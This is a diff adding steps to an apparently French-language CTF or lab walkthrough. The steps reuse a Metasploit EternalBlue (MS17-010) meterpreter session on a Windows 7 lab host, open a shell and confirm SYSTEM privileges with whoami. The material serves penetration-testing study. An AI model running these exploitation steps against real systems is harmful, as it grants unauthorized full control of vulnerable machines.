@@ -286,3 +286,21 @@ Active sessions
   1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.8.237.162:4444 -> 10.10.214.31:49199 (10.10.214.31)
 ```
 
+- Retourner sur la session
+```
+msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions 1
+```
+
+- Basculer à nouveau sur le shell et vérifier que l'attaque d'escalation a réussi
+
+```
+meterpreter > shell
+Process 2768 created.
+Channel 2 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
